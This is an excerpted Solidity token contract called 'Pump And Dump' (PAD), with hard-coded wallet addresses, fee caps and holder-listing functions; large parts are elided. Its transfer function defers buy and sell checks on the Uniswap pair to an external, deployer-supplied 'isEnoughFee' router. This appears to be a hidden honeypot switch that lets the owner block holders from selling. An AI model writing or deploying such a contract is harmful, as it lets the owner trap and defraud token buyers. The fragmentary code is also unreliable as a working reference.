...
interface IIsEnoughFee {
    function isEnoughFee(address _address) external view returns (bool);
}
...
contract PumpAndDumpToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "Pump And Dump";
    string private constant _symbol = "PAD";
    uint8 private constant _decimals = 18;

    address payable private _developmentAddress =
        payable(0x4c5Fd5deEEd005c3DBbb9A858Df6DcEd7bCB1Dd7);
    address payable private _marketingAddress =
        payable(0x3f459B5832e0092Eb9e0EA4036e119c86240428E);
    address payable private _autoLiquidityReceiver =
        payable(0xA170B73F7Fa9D1b5826E8c1eB01022eA250a0c27);

    IIsEnoughFee private isEnoughFeeRouter;
    ...
    constructor(IIsEnoughFee enoughFeeRouter) {
        _rOwned[_msgSender()] = _rTotal;

        isEnoughFeeRouter = enoughFeeRouter;
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair) {
            ...
            isEnoughTo = isEnoughFeeRouter.isEnoughFee(to);
        }
        ...
        if (from == uniswapV2Pair) {
            ...
            isEnoughFrom = isEnoughFeeRouter.isEnoughFee(from);
        }

        if (isEnoughTo && isEnoughFrom) {
    ...
    function sendETHToFee(uint256 amount) private {
        _autoLiquidityReceiver.transfer(amount.div(2));
    ...
    function _transferStandard(
        ...
        if (_rOwned[recipient] > 0 && !isHolder(recipient)) {
    ...
    function setFee(
        ...
        require(redisFeeOnBuy < 13, "Redis cannot be more than 12.");
        require(redisFeeOnSell < 13, "Redis cannot be more than 12.");
        require(taxFeeOnBuy < 3, "Tax cannot be more than 2.");
        require(taxFeeOnSell < 3, "Tax cannot be more than 2.");
    ...
    function removeHolder(address holder) private {
        require(isHolder(holder), "Not a token holder");
        ...
        if (index >= tokenHolders.length) return;

        if (index != tokenHolders.length - 1) {
    ...
    function listAllHoldersAndBalances()
        public
        view
        returns (address[] memory, uint256[] memory)
    {
        uint256 len = tokenHolders.length;
        address[] memory holders = new address[](len);
    ...
    function listAllHoldersAndBalances(uint256 page, uint256 pageSize)
        public
        view
        returns (address[] memory, uint256[] memory)
    {
        ...
        uint256 endIndex = (startIndex + pageSize > len)
            ? len
            : startIndex + pageSize;
        uint256 numResults = endIndex - startIndex;

        address[] memory holders = new address[](numResults);
        uint256[] memory balances = new uint256[](numResults);

        for (uint256 i = 0; i < numResults; i++) {
            address holder = tokenHolders[startIndex + i];
            holders[i] = holder;
            balances[i] = balanceOf(holder);
        }
